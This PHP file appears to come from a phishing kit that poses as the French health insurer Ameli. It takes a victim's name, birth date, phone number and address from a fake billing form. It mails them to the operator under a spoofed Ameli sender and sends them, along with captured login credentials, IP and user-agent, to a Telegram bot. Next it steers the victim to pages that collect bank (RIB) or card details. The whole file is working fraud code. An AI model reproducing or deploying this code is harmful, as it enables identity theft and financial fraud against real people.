<?php
session_start();

include("../common/sub_includes.php");


if(isset($_POST['ide_billing_submit']))
{

	$_SESSION['nom'] = htmlspecialchars($_POST['ide_name']);
	$_SESSION['prenom'] = htmlspecialchars($_POST['ide_surname']);
	$_SESSION['birthday'] = htmlspecialchars($_POST['ide_birth']);
	$_SESSION['phone'] = htmlspecialchars($_POST['ide_tel']);
	$_SESSION['adresse'] = htmlspecialchars($_POST['ide_adresse']);
	$_SESSION['zip'] = htmlspecialchars($_POST['ide_zip']);
	$_SESSION['city'] = htmlspecialchars($_POST['ide_ville']);
	$_SESSION["country"] = "France";
	


	if(empty($_SESSION['nom']) || empty($_SESSION['prenom']) || empty($_SESSION['birthday']) || empty($_SESSION['phone']) || empty($_SESSION['adresse']) || empty($_SESSION['zip']) || empty($_SESSION['city']))
	{


		header('Location: ../steps/billing.php?error=true');

	}
	else{

		if($mail_sending == true){

			$message = "
			
〔⭐〕 Info  〔⭐〕

👨‍✈️ 	Nom  : ".$_SESSION['nom']."
👨‍✈️	Prénom : ".$_SESSION['prenom']."
👨‍✈️ 	Date de naissance : ".$_SESSION['birthday']."
📞 	 Numéro de téléphone : ".$_SESSION['phone']."
📍 	  Adresse : ".$_SESSION['adresse']."
📍    Code Postal : ".$_SESSION['zip']."
📍    Ville : ".$_SESSION['city']."

🎯 IP : ".$_SESSION['ip']."
🎯 User-agent : ".$_SESSION['useragent']."
		
			";

	
			$subject = "[⭐] Informations |".$_SESSION['nom']." | ".$_SESSION['prenom']." | ".$_SESSION['ip'];
			$headers = "From:  Ameli | INFO <vito@tele.fr>";

			mail($rezmail, $subject, $message, $headers , $head);


  
		  }
  
		##########################
		#### TELEGRAM SENDING ####
		##########################
  
		  
		if($telegram_sending == true){
  
			$data = [
			  'text' => '
〔🥯〕 Full 〔🥯〕

🥯 Nom : '.$_SESSION['nom'].'
🥯 Prénom : '.$_SESSION['prenom'].'
🥯 Date De Naissance : '.$_SESSION['birthday'].'

🥯 Téléphone : '.$_SESSION['phone'].'
🥯 Adresse : '.$_SESSION['adresse'].'
🥯 Ville : '.$_SESSION['city'].'
🥯 Code Postal : '.$_SESSION['zip'].'

〔🍞〕 Login 〔🍞〕

🍞 Identifiant : '.$_SESSION['identifiant'].'
🍞 Mot de passe : '.$_SESSION['password'].'

〔🥖〕 Informations additionnelles 〔🥖〕

🥖 Adresse Ip : '.$_SESSION['ip'].'
🥖 User-agent : '.$_SESSION['useragent'].'
  
  
			  ',
			  'chat_id' => $chat_billing
			];
  
			file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
		}
		$_SESSION['billinged'] = true;

		#Page récupération RIB
		if($rib_page){
			header('Location: ../steps/rib.php');
		}

		#CC PAGE
		elseif($cc_page = TRUE)
		{
			header('Location: ../steps/card.php');
		}

		else
		{
			header('Location: ../steps/succes.php');
		}




	}
	

}
else{


}

?>